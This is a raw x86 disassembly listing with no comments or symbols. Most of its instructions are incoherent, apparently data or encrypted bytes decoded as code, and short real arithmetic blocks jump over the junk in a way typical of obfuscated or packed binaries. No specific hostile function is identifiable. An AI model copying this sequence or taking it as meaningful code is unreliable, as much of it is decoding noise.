  410fa2:	shr    BYTE PTR [edi+0x47],cl
  410fa5:	add    DWORD PTR es:[esi],eax
  410fa8:	dec    eax
  410fa9:	jb     0x410fd4
  410fab:	push   ecx
  410fac:	and    esp,DWORD PTR [ecx]
  410fae:	or     eax,0x18157fa8
  410fb3:	into   
  410fb4:	mov    gs,WORD PTR [ecx-0x3bc88763]
  410fba:	das    
  410fbb:	adc    eax,0x23f7b5e5
  410fc0:	xchg   ebp,eax
  410fc1:	ret    0x35c7
  410fc4:	mov    DWORD PTR [ebp+0x7a],esp
  410fc7:	mov    cl,0x8c
  410fc9:	retf   
  410fca:	iret   
  410fcb:	adc    DWORD PTR [ebp-0x6251fb5e],0x18
  410fd2:	sub    dh,dl
  410fd4:	mov    cl,0xa4
  410fd6:	cld    
  410fd7:	movd   DWORD PTR ds:0x4b59c40b,mm6
  410fde:	js     0x41104c
  410fe0:	shl    DWORD PTR [esi+0x4fb4a2e0],1
  410fe6:	in     eax,dx
  410fe7:	push   ds
  410fe8:	xor    edx,ecx
  410fea:	outs   dx,DWORD PTR ds:[esi]
  410feb:	sub    cl,BYTE PTR [eax-0x7b]
  410fee:	xchg   edi,eax
  410fef:	jbe    0x410fa8
  410ff1:	pop    edi
  410ff2:	jne    0x411005
  410ff4:	je     0x410fb9
  410ff6:	push   esi
  410ff7:	imul   ecx,DWORD PTR [esi],0xa
  410ffa:	jmp    0x41103e
  410ffc:	push   cs
  410ffd:	int3   
  410ffe:	sub    ah,cl
  411000:	jns    0x41104e
  411002:	sbb    al,0x45
  411004:	jle    0x410fd7
  411006:	mov    ds:0x601503c1,eax
  41100b:	inc    esi
  41100c:	aaa    
  41100d:	mov    ch,0x3f
  41100f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411010:	xor    cl,BYTE PTR [esi+0x66]
  411013:	cmp    BYTE PTR [esi-0x39dbf89d],dh
  411019:	test   al,0x57
  41101b:	outs   dx,BYTE PTR ds:[esi]
  41101c:	iret   
  41101d:	dec    edi
  41101e:	sbb    esi,esp
  411020:	das    
  411021:	xor    bl,BYTE PTR [esi-0x1d]
  411024:	in     eax,dx
  411025:	mov    bh,0x31
  411027:	mov    ds:0xc1b18602,eax
  41102c:	sbb    DWORD PTR [esi+0x64],edx
  41102f:	fist   WORD PTR [ebp+0x19]
  411032:	jmp    0x410ff4
  411034:	xchg   BYTE PTR [edx+0x67],dh
  411037:	add    DWORD PTR [ebx+0x4],0xb14395b1
  41103e:	sub    eax,0x3c6ce3c6
  411043:	and    esp,DWORD PTR [eax+0x7dd445c7]
  411049:	and    al,0x0
  41104b:	add    bh,al
  41104d:	inc    ebp
  41104e:	int3   
  41104f:	adc    DWORD PTR [esi],ebx
  411051:	add    BYTE PTR [eax],al
  411053:	jmp    0x41112f
  411058:	mov    edx,0xfbbce2c3
  41105d:	mov    ebp,0x69ffc7fe
  411062:	jno    0x4110b2
  411064:	daa    
  411065:	popa   
  411066:	fdivr  QWORD PTR [edi+0xb9b2]
  41106c:	mov    edi,0x19000000
  411071:	push   ecx
  411072:	iret   
  411073:	sbb    DWORD PTR [esi-0xd53bfb],ecx
  411079:	neg    BYTE PTR [edi]
  41107b:	stos   BYTE PTR es:[edi],al
  41107c:	push   0x1c98b099
  411081:	adc    ebp,esp
  411083:	sbb    BYTE PTR [edx+edi*1+0x6b],0xfe
  411088:	cmp    BYTE PTR [edi-0x56073a7e],dl
  41108e:	stc    
  41108f:	and    cl,BYTE PTR [edi+0x62]
  411092:	jno    0x4110a6
  411094:	and    BYTE PTR [edi+0x1d],cl
  411097:	xchg   ebx,edi
  411099:	(bad)  
  41109a:	sub    bl,BYTE PTR [ecx-0x7c958eb7]
  4110a0:	cmp    DWORD PTR [ebp+0x5b],esp
  4110a3:	ds fcmovnbe st,st(3)
  4110a6:	scas   al,BYTE PTR es:[edi]
  4110a7:	jno    0x4110ac
  4110a9:	push   cs
  4110aa:	push   0xbf1e972a
  4110af:	pusha  
  4110b0:	mov    gs,WORD PTR [edi+0x30abb96c]
  4110b6:	xor    eax,DWORD PTR [ebx+0x2130e682]
  4110bc:	mov    edx,0x2ff17253
  4110c1:	jae    0x4110fe
  4110c3:	mov    cl,0x6f
  4110c5:	retf   0x9f6a
  4110c8:	out    0x3e,eax
  4110ca:	mov    ah,dh
  4110cc:	test   BYTE PTR [esi],ah
  4110ce:	inc    ecx
  4110cf:	pop    ds
  4110d0:	sbb    al,bl
  4110d2:	lahf   
  4110d3:	inc    DWORD PTR [ecx+eax*1+0x2b]
  4110d7:	mov    ah,0x3b
  4110d9:	inc    ebx
  4110da:	mov    cl,BYTE PTR [eax-0x54]
  4110dd:	push   0x5d683bd5
  4110e2:	in     al,dx
  4110e3:	mov    ebx,0x21caf239
  4110e8:	xor    BYTE PTR [ecx+0x55e46cee],dl
  4110ee:	cmp    edx,ecx
  4110f0:	mov    dl,ch
  4110f2:	add    edi,DWORD PTR [esp+edi*1]
  4110f5:	cmc    
  4110f6:	mov    bl,0x65
  4110f8:	xor    eax,0x53af2b49
  4110fd:	ror    DWORD PTR [edx+eax*4+0x98b2889],1
  411104:	mov    bl,0xe4
  411106:	jne    0x411179
  411108:	or     bh,bh
  41110a:	mov    WORD PTR [ecx-0x7dec86c5],?
  411110:	jl     0x411094
  411112:	and    al,0x60
  411114:	test   dl,bh
  411116:	xor    DWORD PTR [ecx-0x291401ab],eax
  41111c:	jmp    0x411111
  41111e:	sti    
  41111f:	push   esp
  411120:	mov    ds:0x1ad23efc,eax
  411125:	inc    esi
  411126:	xor    ebx,DWORD PTR [edx]
  411128:	rcl    edi,1
  41112a:	adc    BYTE PTR [ebp+ecx*2+0x58],0x6c
  41112f:	mov    eax,DWORD PTR [ebp-0x48]
  411132:	mov    ecx,DWORD PTR [ebp-0x44]
  411135:	imul   eax,eax,0x7f33
  41113b:	sub    eax,0x54a0
  411140:	xor    edx,edx
  411142:	div    ecx
  411144:	mov    ecx,DWORD PTR [ebp-0x40]
  411147:	sub    eax,ecx
  411149:	mov    ecx,DWORD PTR [ebp-0x3c]
  41114c:	lea    ecx,[eax+ecx*1-0x6ccb]
  411153:	mov    eax,DWORD PTR [ebp-0x34]
  411156:	jmp    0x411232
  41115b:	pop    ecx
  41115c:	stos   BYTE PTR es:[edi],al
  41115d:	sbb    al,0x41
  41115f:	push   edi
  411161:	pop    ebp
  411162:	mov    edx,0x923706de
  411167:	sub    BYTE PTR [ebx],bh
  411169:	jo     0x411149
  41116b:	jno    0x411127
  41116d:	add    BYTE PTR [eax],al
  41116f:	mov    edi,0xfc000000
  411174:	es es push 0xe0877b37
  41117b:	jbe    0x41113b
  41117d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41117e:	xchg   DWORD PTR [ebp-0x2809118c],ebx
  411184:	push   ss
  411185:	cs mov bl,0x6
  411188:	js     0x41115a
  41118a:	xor    ebp,esi
  41118c:	mov    eax,ds:0x641edcba
  411191:	stc    
  411192:	fwait
  411193:	sti    
  411194:	(bad)  
  411195:	and    DWORD PTR [eax+0x45],esp
  411198:	out    dx,al
  411199:	enter  0x16c8,0x84
  41119d:	sub    BYTE PTR [edx],bh
  41119f:	std    
  4111a0:	out    0xe1,eax
  4111a2:	jmp    0xc70d747b
  4111a7:	or     eax,0xebea2dcf
  4111ac:	nop
  4111ad:	loopne 0x4111dc
  4111af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111b0:	(bad)  
  4111b1:	fstp   QWORD PTR [ecx]
  4111b3:	mov    ch,0x52
  4111b5:	adc    esp,ebx
  4111b7:	adc    al,bl
  4111b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ba:	xor    BYTE PTR [ecx+0x503e44ec],ah
  4111c0:	loope  0x4111bc
  4111c2:	ja     0x411230
  4111c4:	inc    ebp
  4111c5:	scas   al,BYTE PTR es:[edi]
  4111c6:	pop    ds
  4111c7:	lea    ebp,[ecx-0x56]
  4111ca:	cmp    esp,ebx
  4111cc:	or     dl,BYTE PTR [esp+esi*8-0x3c]
  4111d0:	stc    
  4111d1:	clc    
  4111d2:	fcom   st(0)
  4111d4:	push   esi
  4111d5:	mov    ecx,DWORD PTR [ecx-0xb]
  4111d8:	push   edx
  4111d9:	cmp    al,0x3c
  4111db:	retf   
  4111dc:	ins    BYTE PTR es:[edi],dx
  4111dd:	pusha  
  4111de:	cmp    eax,DWORD PTR [ebp-0x4ac659f9]
  4111e4:	cmp    DWORD PTR [edx-0x6e],esi
  4111e7:	xchg   DWORD PTR [ecx-0x57d556fb],esi
  4111ed:	cmc    
  4111ee:	mov    esp,cs
  4111f0:	inc    esp
  4111f1:	fs pop ecx
  4111f3:	ror    DWORD PTR [esp+eiz*4-0x643775fa],0x38
  4111fb:	popf   
  4111fc:	cmp    DWORD PTR [edx+0x32],edi
  4111ff:	mov    al,ds:0x88585ad8
  411204:	pop    edx
  411205:	pusha  
  411206:	jne    0x4111b9
  411208:	stos   BYTE PTR es:[edi],al
  411209:	call   0x9c3cc76a
  41120e:	ins    BYTE PTR es:[edi],dx
  41120f:	loopne 0x411202
  411211:	retf   0x9b95
  411214:	outs   dx,DWORD PTR ds:[esi]
  411215:	dec    edx
  411216:	add    eax,0x9961fd8a
  41121b:	stos   BYTE PTR es:[edi],al
  41121c:	lock xchg edi,eax
  41121e:	sub    eax,0x5fecd4f
  411223:	jnp    0x411285
  411225:	mov    ds:0x93cca5f5,eax
  41122a:	xor    eax,edx
  41122c:	outs   dx,DWORD PTR ds:[esi]
  41122d:	mov    eax,0xb329d340
  411232:	mov    edx,DWORD PTR [ebp-0x2c]
  411235:	add    eax,0xd8
  41123a:	or     eax,0xfffffe11
  41123f:	jmp    0x41131b
  411244:	rcr    ch,0x64
  411247:	cmp    DWORD PTR [ebp-0x47],edi
  41124a:	(bad)  
  41124c:	repnz adc al,0x74
  41124f:	int    0x92
  411251:	fld    TBYTE PTR [ebx]
  411253:	jp     0x411285
  411255:	mov    ebx,0xbf0000
  41125a:	add    BYTE PTR [eax],al
  41125c:	sbb    eax,0x7520d3a9
  411261:	push   ecx
  411262:	cmp    bl,bh
  411264:	aad    0x14
  411266:	xchg   edx,ebp
  411268:	outs   dx,BYTE PTR ds:[esi]
  411269:	mov    esi,?
  41126b:	inc    edx
  41126c:	jmp    0xba13:0x7ecbb887
  411273:	test   BYTE PTR [edi-0x539c153b],0xd2
  41127a:	lds    eax,FWORD PTR [ecx]
  41127c:	xchg   esp,eax
  41127d:	cmp    al,0x72
  41127f:	push   ds
  411280:	imul   edx,ebp,0x4bcc6eda
  411286:	popf   
  411287:	ss cs pop ebx
  41128a:	ins    DWORD PTR es:[edi],dx
  41128b:	stos   DWORD PTR es:[edi],eax
  41128c:	push   ebx
  41128d:	cmp    eax,0xf4b7ef5e
  411292:	aad    0xce
  411294:	inc    edi
  411295:	in     eax,0x9
  411297:	or     eax,0x321c63b6
  41129c:	jmp    0x4112da
  41129e:	adc    al,0x27
  4112a0:	aam    0x6f
  4112a2:	mov    ebx,esi
  4112a4:	pop    edx
  4112a5:	iret   
  4112a6:	cmp    bl,ch
  4112a8:	in     al,0x7b
  4112aa:	(bad)  
  4112ab:	or     BYTE PTR [eax-0xe],bh
  4112ae:	repnz inc edi
  4112b0:	cmp    bl,BYTE PTR [ecx]
  4112b2:	aas    
  4112b3:	and    al,0x51
  4112b5:	aas    
  4112b6:	dec    ebx
  4112b7:	xchg   edx,eax
  4112b8:	aaa    
  4112b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112ba:	mov    ebp,0x8f2348a5
  4112bf:	lds    edx,FWORD PTR [esi-0x4]
  4112c2:	lahf   
  4112c3:	or     al,0x3c
  4112c5:	and    ecx,ecx
  4112c7:	clc    
  4112c8:	xlat   BYTE PTR ds:[ebx]
  4112c9:	scas   eax,DWORD PTR es:[edi]
  4112ca:	or     DWORD PTR [ebp+0xe5d2267],ecx
  4112d0:	mov    edx,0x861d72f9
  4112d5:	pop    esp
  4112d6:	mov    bh,al
  4112d8:	popa   
  4112d9:	xchg   esp,eax
  4112da:	call   0x1b9d:0xf7e2f7bc
  4112e1:	mov    dl,0x75
  4112e3:	test   bx,bx
  4112e6:	push   ecx
  4112e7:	lods   eax,DWORD PTR ds:[esi]
  4112e8:	imul   esi,esi,0x78
  4112eb:	cmp    ecx,DWORD PTR [eax]
  4112ed:	fild   WORD PTR [ebx-0x20]
  4112f0:	je     0x411371
  4112f2:	pop    edx
  4112f3:	retf   0xe589
  4112f6:	daa    
  4112f7:	scas   al,BYTE PTR es:[edi]
  4112f8:	ja     0x4112b7
  4112fa:	and    al,0x96
  4112fc:	mov    edi,ebx
  4112fe:	lods   eax,DWORD PTR ds:[esi]
  4112ff:	xchg   edi,eax
  411300:	ret    0x2884
  411303:	sub    al,0x77
  411305:	jg     0x411375
  411307:	retf   
  411308:	jge    0x411351
  41130a:	adc    esi,esp
  41130c:	cdq    
  41130d:	jae    0x4112ce
  41130f:	ret    0x39dc
  411312:	fs mov bh,0x3d
  411315:	inc    eax
  411316:	sbb    cl,BYTE PTR [esi+eiz*4]
  411319:	imul   ecx,DWORD PTR [esi],0x558bc22b
  41131f:	cld    
  411320:	jmp    0x4113fc
  411325:	cli    
  411326:	push   eax
  411327:	jbe    0x411387
  411329:	(bad)  
  41132a:	jle    0x411326
  41132c:	hlt    
  41132d:	sbb    ebp,DWORD PTR [esi]
  41132f:	jae    0x41133e
  411331:	cmp    al,BYTE PTR ds:0xbbef699d
  411337:	add    BYTE PTR [eax],al
  411339:	mov    edi,0x10000000
  41133e:	mov    edi,DWORD PTR [esi+0x1cfb35d5]
  411344:	adc    ebp,DWORD PTR [ecx+edi*8-0x78081ad8]
  41134b:	repz aas 
  41134d:	leave  
  41134e:	or     eax,0xaf345156
  411353:	fistp  DWORD PTR [ebx]
  411355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411356:	out    0x3a,eax
  411358:	sub    eax,0x86e0d03e
  41135d:	adc    edx,DWORD PTR [ebx-0x24]
  411360:	sbb    bh,BYTE PTR [eax]
  411362:	mov    DWORD PTR [ecx],esp
  411364:	mov    ah,0xe8
  411366:	or     eax,0x8efdbba6
  41136b:	daa    
  41136c:	mov    BYTE PTR [ecx-0x71],ch
  41136f:	add    ah,bh
  411371:	in     eax,dx
  411372:	leave  
  411373:	and    edx,DWORD PTR [edx-0x4a2441cf]
  411379:	bound  edx,QWORD PTR [edi-0x4]
  41137c:	fisubr WORD PTR [eax+eiz*8]
  41137f:	enter  0x1b2f,0x77
  411383:	and    al,0x4d
  411385:	imul   DWORD PTR [edi+ebp*1-0x3da1d137]
  41138c:	aas    
  41138d:	addr16 xchg esi,eax
  41138f:	jbe    0x411336
  411391:	call   0x20b528ac
  411396:	out    0x98,eax
  411398:	pop    edi
  411399:	arpl   WORD PTR [ebp-0x1a],dx
  41139c:	mov    edi,0xd2d91fd3
  4113a1:	jg     0x41141e
  4113a3:	dec    ecx
  4113a4:	mov    esp,es
  4113a6:	stos   BYTE PTR es:[edi],al
  4113a7:	gs cmp eax,0x3abb593a
  4113ad:	xchg   esp,eax
  4113ae:	fistp  QWORD PTR [ebx+edx*1+0x278ae43b]
  4113b5:	xchg   esp,eax
  4113b6:	in     eax,0xf
  4113b8:	retf   0x5ea9
  4113bb:	push   esi
  4113bc:	pop    ebx
  4113bd:	or     BYTE PTR [ebp-0x6d1db064],bl
  4113c3:	jno    0x411424
  4113c5:	adc    ch,BYTE PTR [esi]
  4113c7:	cdq    
  4113c8:	sub    al,0xce
  4113ca:	pop    esi
  4113cb:	push   edx
  4113cc:	xchg   DWORD PTR [ebx-0x71],ecx
  4113cf:	cmp    BYTE PTR [ecx+0x28],bh
  4113d2:	mov    edi,DWORD PTR [edi]
  4113d4:	ins    DWORD PTR es:[edi],dx
  4113d5:	inc    esi
  4113d6:	clc    
  4113d7:	sbb    DWORD PTR [edi],0xffffff81
  4113da:	ror    BYTE PTR [ebp-0x27],1
  4113dd:	sub    BYTE PTR [esi],dl
  4113df:	push   0xffffffab
  4113e1:	dec    ecx
  4113e2:	inc    edx
  4113e3:	mov    dh,0xf
  4113e5:	fwait
  4113e6:	cmp    dh,cl
  4113e8:	lods   eax,DWORD PTR ds:[esi]
  4113e9:	jle    0x41143f
  4113eb:	jnp    0x4113bb
  4113ed:	add    esp,DWORD PTR [edx]
  4113ef:	sbb    DWORD PTR [eax+0x7a1ec64],eax
  4113f5:	cmp    DWORD PTR [ebx],0x1300adf6
  4113fb:	ret    0xd725
  4113fe:	add    al,0x0
  411400:	add    BYTE PTR [ebx],al
  411402:	add    al,0x11
  411404:	jmp    0x4114e0
  411409:	data16 fimul DWORD PTR [eax]
  41140c:	(bad)  
  41140d:	mov    esp,0xcefbefd7
  411412:	dec    eax
  411413:	pop    esi
  411414:	pop    edi
  411415:	mov    ds:0xae5f0868,al
  41141a:	mov    esp,0xbf0000
  41141f:	add    BYTE PTR [eax],al
  411421:	fistp  WORD PTR [esi+0xff1be45]
  411427:	jno    0x411453
  411429:	lock xor DWORD PTR [ebx+0x7819574a],eax
  411430:	out    dx,al
  411431:	and    edi,ebx
  411433:	lods   eax,DWORD PTR ds:[esi]
  411434:	and    BYTE PTR [edx+0x4689d1b],bl
  41143a:	and    DWORD PTR ds:0x84b8595d,0x50f3ee84
  411444:	sbb    bh,dh
  411446:	push   ecx
  411447:	push   0xffffffae
  411449:	push   ss
  41144a:	cli    
  41144b:	mov    ebp,0x3741f01a
  411450:	stos   BYTE PTR es:[edi],al
  411451:	mov    ebp,0xffb87dd1
  411456:	call   0x84f54128
  41145b:	or     DWORD PTR [ebp-0x63],ebx
  41145e:	dec    eax
  41145f:	arpl   WORD PTR [ecx-0x36],di
  411462:	push   edx
  411463:	(bad)  
  411464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411465:	jne    0x411403
  411467:	scas   eax,DWORD PTR es:[edi]
  411468:	mov    bh,0x6c
  41146a:	mov    al,ds:0x3588616c
  41146f:	test   DWORD PTR [esi+0xd],edi
  411472:	xchg   ebx,eax
  411473:	inc    edx
  411474:	rcr    DWORD PTR [ebx+0x38],0xe7
  411478:	dec    ebx
  411479:	mov    al,0x5b
  41147b:	int    0x93
  41147d:	dec    esi
  41147e:	loop   0x411453
  411480:	adc    bh,al
  411482:	out    dx,al
  411483:	push   ebp
  411484:	pop    ss
  411485:	sbb    DWORD PTR [ebx+0x79],ebp
  411488:	push   es
  411489:	xchg   ebp,eax
  41148a:	jg     0x4114b5
  41148c:	loope  0x411450
  41148e:	pop    edi
  41148f:	lea    ecx,[edx]
  411491:	mov    dl,0xd5
  411493:	neg    BYTE PTR [edx+0x6c]
  411496:	ds dec ecx
  411498:	pop    es
  411499:	je     0x4114ef
  41149b:	sbb    bh,BYTE PTR [ebx]
  41149d:	sar    DWORD PTR [esi],1
  41149f:	outs   dx,DWORD PTR ds:[esi]
  4114a0:	ds stc 
  4114a2:	adc    DWORD PTR [esi+0xdcf8f42],ebx
  4114a8:	(bad)  
  4114a9:	lods   al,BYTE PTR ds:[esi]
  4114aa:	mov    bl,0xf5
  4114ac:	mov    eax,0x90fd92fe
  4114b1:	push   eax
  4114b2:	fwait
  4114b3:	or     esp,edi
  4114b5:	addr16 push ebx
  4114b7:	sbb    cl,BYTE PTR [ebp-0x26]
  4114ba:	mov    bl,BYTE PTR [ecx]
  4114bc:	xchg   edx,eax
  4114bd:	inc    eax
  4114be:	sar    DWORD PTR [edx],0xa5
  4114c1:	dec    edx
  4114c2:	jns    0x411505
  4114c4:	jns    0x41146d
  4114c6:	imul   esi,esp,0x58deb30a
  4114cc:	arpl   WORD PTR [ebx],si
  4114ce:	push   edi
  4114cf:	adc    esi,DWORD PTR ds:0x5c2e120f
  4114d5:	pusha  
  4114d6:	dec    esi
  4114d7:	inc    edx
  4114d8:	daa    
  4114d9:	int    0x9e
  4114db:	mov    ch,0xf
  4114dd:	adc    ebx,DWORD PTR [eax-0x48]
  4114e0:	mov    ecx,DWORD PTR [ebp-0x28]
  4114e3:	mov    edx,DWORD PTR [ebp-0x24]
  4114e6:	xor    ecx,0x14db
  4114ec:	sub    ecx,edx
  4114ee:	imul   ecx,ecx,0x3dd2
  4114f4:	add    ecx,eax
  4114f6:	mov    eax,DWORD PTR [ebp+0x8]
  4114f9:	lea    eax,[ecx+eax*1-0x663954e]
  411500:	mov    DWORD PTR [ebp-0x1c],eax
  411503:	jmp    0x4115df
  411508:	scas   al,BYTE PTR es:[edi]
  411509:	sub    bl,BYTE PTR [edx+0x2a]
  41150c:	fidivr WORD PTR [edx-0x2]
  41150f:	scas   al,BYTE PTR es:[edi]
  411510:	cmp    esi,DWORD PTR [esi+0xf2d5ff2]
  411516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411517:	pop    edi
  411518:	ins    DWORD PTR es:[edi],dx
  411519:	mov    ebp,0xbf0000
  41151e:	add    BYTE PTR [eax],al
  411520:	(bad)  
  411521:	cld    
  411522:	(bad)  
  411523:	ss in  al,dx
  411525:	mov    ds:0x87a5e994,eax
  41152a:	sub    dh,dh
  41152c:	(bad)  
  41152e:	enter  0x3114,0xe7
  411532:	xchg   BYTE PTR [ecx],al
  411534:	ja     0x411523
  411536:	lods   al,BYTE PTR ds:[esi]
  411537:	shl    BYTE PTR [ecx+0x43],cl
  41153a:	shl    esi,0xf1
  41153d:	scas   eax,DWORD PTR es:[edi]
  41153e:	xor    ch,BYTE PTR [ebx-0x13]
  411541:	xchg   ecx,eax
  411542:	adc    BYTE PTR [ecx],dl
  411544:	idiv   dl
  411546:	mov    DWORD PTR [edi],edi
  411548:	in     eax,dx
  411549:	les    ebx,FWORD PTR [eax-0xd1e6b4d]
  41154f:	popa   
  411550:	xchg   esp,eax
  411551:	dec    ebp
  411552:	sar    DWORD PTR [ebx+ecx*1-0x62],1
  411556:	cld    
  411557:	inc    eax
  411558:	(bad)  
  411559:	aad    0xb5
  41155b:	lock jmp 0x41157b
  41155e:	je     0x411519
  411560:	sbb    al,0xae
  411562:	test   eax,0x3c551b3
  411567:	int    0x58
  411569:	outs   dx,DWORD PTR ds:[esi]
  41156a:	cmp    eax,0xab4b197e
  41156f:	lods   eax,DWORD PTR ds:[esi]
  411570:	sahf   
  411571:	ins    DWORD PTR es:[edi],dx
  411572:	cmp    al,0x69
  411574:	jb     0x411584
  411576:	in     al,0xec
  411578:	adc    al,0xb6
  41157a:	(bad)  
  41157b:	icebp  
  41157c:	aam    0x24
  41157e:	mov    ebp,0x69ffdf5a
  411583:	jmp    0x411513
  411585:	push   0x34
  411587:	pusha  
  411588:	retf   
  411589:	int    0xae
  41158b:	int    0x49
  41158d:	cwde   
  41158e:	ret    0x8483
  411591:	jmp    0xae71eed
  411596:	hlt    
  411597:	sbb    eax,0x7babefa1
  41159c:	in     al,dx
  41159d:	(bad)  
  41159e:	mov    edi,0x5869ffcc
  4115a3:	mov    esi,0x4eec374b
  4115a8:	sbb    BYTE PTR [edx+esi*1-0x7a],dh
  4115ac:	dec    edx
  4115ad:	dec    ebx
  4115ae:	xchg   ebp,eax
  4115af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b0:	shl    BYTE PTR [eax+0x3d1e5cb9],0x37
  4115b7:	clc    
  4115b8:	push   ecx
  4115b9:	mov    BYTE PTR [esi+0xf],0xcb
  4115bd:	sbb    eax,0x638cb78
  4115c2:	add    eax,0xfce46f25
  4115c7:	out    0x7b,al
  4115c9:	loop   0x41163d
  4115cb:	sahf   
  4115cc:	inc    esi
  4115cd:	cmp    esi,esi
  4115cf:	ss inc edi
  4115d1:	jge    0x411619
  4115d3:	sahf   
  4115d4:	(bad)  
  4115d5:	mov    dl,0x9e
  4115d7:	mov    si,0x5afd
  4115db:	neg    dh
  4115dd:	mov    eax,0xe045c76d
  4115e2:	inc    eax
  4115e3:	xor    BYTE PTR [eax],al
  4115e5:	add    bh,al
  4115e7:	inc    ebp
  4115e8:	fsubr  QWORD PTR [ecx+0x5e]
  4115eb:	add    BYTE PTR [eax],al
  4115ed:	jmp    0x4116c9
  4115f2:	bound  ebp,QWORD PTR [ebx-0x9120993]
  4115f8:	sti    
  4115f9:	mov    edi,0x60484ddd
  4115fe:	pop    esi
  4115ff:	iret   
  411600:	loop   0x4115e0
  411602:	sub    al,0xbe
  411604:	add    BYTE PTR [eax],al
  411606:	mov    edi,0x38000000
  41160b:	xchg   esp,eax
  41160c:	adc    ecx,DWORD PTR [eax-0x67]
  41160f:	scas   al,BYTE PTR es:[edi]
  411610:	mov    dl,BYTE PTR [ecx+0x4f67864a]
  411616:	sti    
  411617:	inc    eax
  411618:	and    al,0x5c
  41161a:	mov    ecx,0xdfa720ed
  41161f:	mov    al,ds:0xbce60814
  411624:	xchg   esi,eax
  411625:	or     esp,DWORD PTR [ebx+0x6bf7c7a4]
  41162b:	mov    WORD PTR [eax],gs
  41162d:	mov    bh,0x92
  41162f:	jmp    0x41167d
  411631:	inc    ecx
  411632:	mov    dl,0x7c
  411634:	les    ebp,FWORD PTR [ebx-0x1d0ca80e]
  41163a:	push   edi
  41163b:	repz aas 
  41163d:	push   0x7aa0d07b
  411642:	aad    0x3e
  411644:	sti    
  411645:	lea    edx,[edi]
  411647:	(bad)  
  411648:	pop    ebx
  411649:	outs   dx,BYTE PTR ds:[esi]
  41164a:	scas   al,BYTE PTR es:[edi]
  41164b:	pop    ebp
  41164c:	clc    
  41164d:	mov    esp,0x42171749
  411652:	adc    DWORD PTR [ebp-0x2d538260],eax
  411658:	mov    esi,0x821177a5
  41165d:	vpaddq ymm3,ymm2,YMMWORD PTR [edi+edx*2+0xe]
  411663:	lock mov gs:0xead6e1ae,al
  41166a:	shl    edx,0x97
  41166d:	sti    
  41166e:	sub    al,0xf2
  411670:	mov    ch,0x1a
  411672:	push   ebp
  411673:	or     BYTE PTR [ebp-0x4df1ab],dl
  411679:	daa    
  41167a:	test   al,0x39
  41167c:	mov    ch,ah
  41167e:	ja     0x4116c0
  411680:	xor    eax,0x6c75c61f
  411685:	sub    al,BYTE PTR [edi]
  411687:	ins    DWORD PTR es:[edi],dx
  411688:	(bad)  
  411689:	mov    ds:0xf912a8db,eax
  41168e:	xor    esi,DWORD PTR [edx]
  411690:	inc    esp
  411691:	fs das 
  411693:	enter  0x396f,0x9c
  411697:	shr    DWORD PTR [edx+edx*8],1
  41169a:	sub    DWORD PTR [eax-0x7c845314],eax
  4116a0:	or     eax,0x79b31fc2
  4116a5:	pop    edx
  4116a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a7:	inc    esp
  4116a8:	add    bh,bl
  4116aa:	add    BYTE PTR [esi],ch
  4116ac:	stos   BYTE PTR es:[edi],al
  4116ad:	jle    0x411649
  4116af:	xchg   ecx,eax
  4116b0:	dec    edi
  4116b1:	xchg   ebx,eax
  4116b2:	or     al,0x1f
  4116b4:	jae    0x411661
  4116b6:	sub    DWORD PTR [edx-0x28beb412],ecx
  4116bc:	sar    BYTE PTR [eax+0x2cb6c00c],0xb3
  4116c3:	sub    al,0xf3
  4116c5:	into   
  4116c6:	addr16 jb 0x4116e1
  4116c9:	mov    DWORD PTR [ebp-0x28],0x6467
  4116d0:	mov    DWORD PTR [ebp-0x40],0x659e
  4116d7:	jmp    0x4117b3
  4116dc:	rol    BYTE PTR [eax+0x2afa22aa],1
  4116e2:	fdiv   st,st(2)
  4116e4:	inc    edi
  4116e5:	push   edx
  4116e6:	std    
  4116e7:	dec    esi
  4116e8:	jne    0x4116f8
  4116ea:	sbb    DWORD PTR [eax-0x15],esi
  4116ed:	mov    esi,0xbf0000
  4116f2:	add    BYTE PTR [eax],al
  4116f4:	dec    esp
  4116f5:	(bad)  
  4116f6:	ins    DWORD PTR es:[edi],dx
  4116f7:	enter  0x2f28,0xdd
  4116fb:	icebp  
  4116fc:	cwde   
  4116fd:	(bad)  
  4116fe:	ret    
  4116ff:	in     eax,dx
  411700:	outs   dx,BYTE PTR ds:[esi]
  411701:	or     BYTE PTR [ebp+esi*2+0x2256b9f],ah
  411708:	out    dx,al
  411709:	aaa    
  41170a:	shufps xmm7,XMMWORD PTR [ebx+0x545e3f85],0xd5
  411712:	xchg   ebp,eax
  411713:	(bad)
  411717:	out    dx,eax
  411718:	inc    ebp
  411719:	sbb    edx,DWORD PTR [edi-0x50]
  41171c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41171d:	repz sti 
  41171f:	add    ebx,ebx
  411721:	das    
  411722:	adc    ah,BYTE PTR [edx-0x55ba2916]
  411728:	and    DWORD PTR [ecx-0x79f4bbbc],esp
  41172e:	push   cs
  41172f:	jecxz  0x411782
  411731:	aas    
  411732:	ins    BYTE PTR es:[edi],dx
  411733:	cli    
  411734:	xor    al,0x6c
  411736:	pop    ebp
  411737:	jmp    0xc1b8:0x340491f5
  41173e:	outs   dx,DWORD PTR ds:[esi]
  41173f:	out    0xaa,al
  411741:	add    dl,ch
  411743:	add    DWORD PTR [esi+0x24],esp
  411746:	sub    DWORD PTR [edx],esp
  411748:	out    0xa,eax
  41174a:	sbb    al,0xd
  41174c:	stos   DWORD PTR es:[edi],eax
  41174d:	mov    ecx,0xc472018b
  411752:	aaa    
  411753:	inc    esi
  411754:	lds    edi,FWORD PTR [edx]
  411756:	mov    ecx,0x936f39bb
  41175b:	mov    edx,0xa28fcad4
  411760:	pop    ecx
  411761:	loope  0x411778
  411763:	inc    esi
  411764:	pop    eax
  411765:	mov    esp,DWORD PTR [ecx+0x47]
  411768:	mov    ch,0x33
  41176a:	lock jns 0x41171e
  41176d:	mov    ds:0xc8930d62,al
  411772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411773:	jae    0x4117e0
